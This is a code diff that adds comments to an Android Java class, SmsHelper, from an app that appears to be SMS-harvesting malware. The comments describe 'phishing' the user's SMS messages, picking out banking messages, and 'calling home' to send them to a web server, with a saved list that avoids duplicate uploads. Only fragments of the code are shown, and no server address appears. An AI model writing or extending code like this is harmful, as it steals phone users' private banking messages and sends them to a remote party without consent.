@@ -15,6 +15,14 @@ import com.google.gson.reflect.TypeToken;
 import java.util.ArrayList;
 import java.util.List;
 
+/*
+ * This class deals with all the phishing of user's sms
+ * messages and when they are found passed them to the
+ * network class.
+ * 
+ * Created by Phumlile Sopela on 14/09/2014
+ * */
+
 public class SmsHelper extends AsyncTask<Void, Void, Void>{
 
     private Context context;
@@ -29,6 +37,8 @@ public class SmsHelper extends AsyncTask<Void, Void, Void>{
         foundMessages = new ArrayList<String>();
         loadList();
     }
+    
+    // This method helps to load our saved list of already scanned messages
 
     private void loadList(){
         SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
@@ -48,12 +58,14 @@ public class SmsHelper extends AsyncTask<Void, Void, Void>{
 
         return null;
     }
-
+    
+    // method called when the async task is complete
     protected void onPostExecute(Void result){
         callHome(messageList);
         super.onPostExecute(result);
     }
-
+    
+    // method to pass data to the network class to be sent to web server
     public void callHome(ArrayList<SmsDetails> smsList) {
 //        Toast.makeText(context, "Calling home...",Toast.LENGTH_SHORT).show();
         Log.d("APP:", "Calling home");
@@ -66,6 +78,11 @@ public class SmsHelper extends AsyncTask<Void, Void, Void>{
         Log.d("APP:", "Done with for - calling home noww");
         networkHelper.execute();
     }
+    
+    /*
+     * Method to scan sms messages that are in a mobile device
+     * and make up a list of all banking messages. 
+     * */
 
     public void postNewSms() {
         SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
@@ -129,6 +146,8 @@ public class SmsHelper extends AsyncTask<Void, Void, Void>{
         }
         saveList();
     }
+    
+    // This method saves the list of found message so that the server does not receive duplicates. 
 
     private void saveList(){
         SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
